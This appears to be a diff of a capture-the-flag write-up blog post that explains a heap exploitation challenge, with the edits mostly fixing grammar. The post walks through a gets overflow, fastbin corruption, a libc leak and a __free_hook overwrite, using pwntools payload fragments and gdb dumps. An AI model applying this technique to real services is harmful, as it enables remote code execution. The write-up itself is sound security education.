@@ -119,7 +119,7 @@
 	</header>
 
 	<article>
-		<p>In this challenge we are given a service IP and PORT, to which we can connect using <code>netcat</code> or any similar tool.
+		<p>In this challenge, we are given a service IP and PORT, to which we can connect using <code>netcat</code> or any similar tool.
 We are also provided with an <code>ELF</code> file.</p>
 
 <p></p>
@@ -223,13 +223,13 @@ do {
 } while ( choice != 7 );
 </code></pre>
 
-<p>At maximun we can only have 20 items, which are <code>malloc</code>&lsquo;ed and stored in a global array that resides within the <code>.bss</code> segment of the binary.</p>
+<p>At maximum, we can only have 20 items, which are <code>malloc</code>&lsquo;ed and stored in a global array that resides within the <code>.bss</code> segment of the binary.</p>
 
 <p>There is 3 types of items: <code>small = 0x10</code>, <code>medium = 0x38</code>, and <code>large = 0x60</code>.</p>
 
-<p>We notice that all the sizes are within the <code>fastbin</code> size range, so we will be dealing with fastbin chunks only. Now we understand why the word <strong>FASTEST</strong> was in bold in the challenge description ;).</p>
+<p>We notice that all the sizes are within the <code>fast bins</code> size range so we will be dealing with fast bins only. Now we understand why the word <strong>FASTEST</strong> was in bold in the challenge description ;).</p>
 
-<p>Content reading is done using <code>gets</code>, which is known to be unsecure, because it doens&rsquo;t do any bound check. This allows us to write out of the malloc&rsquo;ed item  chunks and thus overwriting stuff.</p>
+<p>Content reading is done using <code>gets</code>, which is known to be insecure because it doesn&rsquo;t do any bound check. This allows us to write out of the malloc&rsquo;ed item chunks and thus overwriting stuff.</p>
 
 <h1 id="fastbin-attack">Fastbin Attack</h1>
 
@@ -237,7 +237,7 @@ do {
 
 <p>But since <code>PIE</code> and <code>ASLR</code> are enabled, we need to defeat them first by leaking some addresses.</p>
 
-<p>We know that <code>smallbins</code> will have a pointer to <code>main_arena</code> in their <strong>FD</strong> and <strong>BK</strong> pointers once free&rsquo;ed, so if we manage to craft a fake <code>smallbin</code>, free it and then create a new empty item, the item will be located in the same region as the previously free&rsquo;ed fake smallbin, so by printing the item we would have leaked a <code>libc</code> address. To do so, we can overwrite into a chunk metadata to corrupt it&rsquo;s <code>size</code> field and make it looks like a <code>smallbin</code>.</p>
+<p>We know that <code>small bins</code> will have a pointer to <code>main_arena</code> in their <strong>FD</strong> and <strong>BK</strong> pointers once free&rsquo;ed, so if we manage to craft a fake <code>smallbin</code>, free it and then create a new empty item, the item will be located in the same region as the previously free&rsquo;ed fake smallbin, so by printing the item we would have leaked a <code>libc</code> address. To do so, we can overwrite into a chunk metadata to corrupt it&rsquo;s <code>size</code> field and make it looks like a <code>smallbin</code>.</p>
 
 <p>The function I used to do the leak looks as follow:</p>
 
@@ -283,29 +283,29 @@ delete_item(7)
 0x80: 0x0
 </code></pre>
 
-<p>Since <strong>FD</strong> needs to point to a valid fastbin chunk that have the size 0x20, this will put some limitations to what we can write, the validation check done by <code>libc</code> is as follow:</p>
+<p>Since <strong>FD</strong> needs to point to a valid fastbin chunk that has the size 0x20, this will put some limitations to what we can write, the validation check done by <code>libc</code> is as follow:</p>
 
 <ul>
-<li>if a chunk <code>A</code> is in fastbin list of size <code>X</code>, then <code>A-&gt;size &gt;&gt; 4 - 2</code> needs to be equal to <code>X</code></li>
+<li>if a chunk <code>A</code> is in a fastbin list of size <code>X</code>, then <code>A-&gt;size &gt;&gt; 4 - 2</code> needs to be equal to <code>X</code></li>
 </ul>
 
 <p>This looks like a hard condition to fulfill, but it&rsquo;s pretty easy to find such a valid fake chunk. Since the <code>size</code> field is at offset <code>8</code> of the struct, we need to find an address <code>A</code> such as the data at <code>A + 8</code> contains a valid chunk size.</p>
 
-<p>powered by <code>gdb</code> I did found a valid address that fullfill that condition. And guess what? it&rsquo;s only 3 bytes far from the global <code>items_list</code> array</p>
+<p>powered by <code>gdb</code> I did find a valid address that fulfills that condition. And guess what? it&rsquo;s only 3 bytes far from the global <code>items_list</code> array</p>
 
 <pre><code>pwndbg&gt; x/5gx 0x55555575602d
-0x55555575602d:	0xaaab0978e0000000	0x000000000000002a
-0x55555575603d:	0x5555758430000000	0x55557584c0000055
-0x55555575604d:	0x5555758530000055
+0x55555575602d:    0xaaab0978e0000000    0x000000000000002a
+0x55555575603d:    0x5555758430000000    0x55557584c0000055
+0x55555575604d:    0x5555758530000055
 pwndbg&gt; x/10gx 0x5555557584c0 
-0x5555557584c0:	0x0041414141414141	0x0000000000000021 &lt;- item 6
-0x5555557584d0:	0x00002aaaab097b78	0x00002aaaab097b78
-0x5555557584e0:	0x0000000000000000	0x0000000000000021 &lt;- item 7 (0x5555557584f0 is what we want to corrupt)
-0x5555557584f0:	0x0000000000000000	0x00002aaaab097ba8
-0x555555758500:	0x0000000000000000	0x0000000000000021
+0x5555557584c0:    0x0041414141414141    0x0000000000000021 &lt;- item 6
+0x5555557584d0:    0x00002aaaab097b78    0x00002aaaab097b78
+0x5555557584e0:    0x0000000000000000    0x0000000000000021 &lt;- item 7 (0x5555557584f0 is what we want to corrupt)
+0x5555557584f0:    0x0000000000000000    0x00002aaaab097ba8
+0x555555758500:    0x0000000000000000    0x0000000000000021
 </code></pre>
 
-<p>With that we can edit the 6&rsquo;th item to corrupt the <strong>FD</strong> of the 7th item.</p>
+<p>With that, we can edit the 6&rsquo;th item to corrupt the <strong>FD</strong> of the 7th item.</p>
 
 <pre><code class="language-python">fake_fast_chunk = pie_base + 0x20202d
 payload = &quot;B&quot; * 16          # Fill current chunk
@@ -324,11 +324,11 @@ edit_item(6, payload)
 0x70: 0x0
 0x80: 0x0
 pwndbg&gt; x/10gx 0x5555557584c0
-0x5555557584c0:	0x0000000000000000	0x0000000000000021 &lt;- item 6
-0x5555557584d0:	0x4242424242424242	0x4242424242424242
-0x5555557584e0:	0x0000000000000000	0x0000000000000021 &lt;- item 7
-0x5555557584f0:	0x000055555575602d	0x00002aaaab097b00
-0x555555758500:	0x0000000000000000	0x0000000000000021
+0x5555557584c0:    0x0000000000000000    0x0000000000000021 &lt;- item 6
+0x5555557584d0:    0x4242424242424242    0x4242424242424242
+0x5555557584e0:    0x0000000000000000    0x0000000000000021 &lt;- item 7
+0x5555557584f0:    0x000055555575602d    0x00002aaaab097b00
+0x555555758500:    0x0000000000000000    0x0000000000000021
 </code></pre>
 
 <p>Now if we allocate 2 new items (small size), the second one will be at our fake chunk. Since our fake chunk is 3 bytes before the global <code>items_list</code> array, by editing it we will place fake addresses in the <code>items_list</code>.</p>
@@ -373,11 +373,11 @@ getchar = u64(leak.ljust(8, &quot;\x00&quot;))
 [*] getchar : 0x2aaaaad49160
 </code></pre>
 
-<p>Using <a href="https://libc.blukat.me/">libc_search</a> we now know that the libc being used is 2.23-ubuntu, and that the offsets of <code>system</code> and <code>__free_hook</code> are <code>0x45390</code> and <code>0x3c67a8</code> respectively.</p>
+<p>Using <a href="https://libc.blukat.me/">libc_search</a> we now know that the libc being used is 2.23-ubuntu and that the offsets of <code>system</code> and <code>__free_hook</code> are <code>0x45390</code> and <code>0x3c67a8</code> respectively.</p>
 
-<p>Now we just need to place <code>__free_hook</code> in <code>items[0]</code> using the same trick as before, and edit it to write the address of <code>system</code>.</p>
+<p>Now we just need to place <code>__free_hook</code> in <code>items[0]</code> using the same trick as before and edit it to write the address of <code>system</code>.</p>
 
-<p>The following python code is the final exploit. I&rsquo;m using <a href="https://github.com/Gallopsled/pwntools">Pwntools</a> to do this, since it makes network programming much more easy and funny.</p>
+<p>The following python code is the final exploit. I&rsquo;m using <a href="https://github.com/Gallopsled/pwntools">Pwntools</a> to do this since it makes network programming much more easy and funny.</p>
 
 <script src="//gist.github.com/segflow/a7142d7e3b866c3577ab8a08ea0c3b9c.js"></script>
 
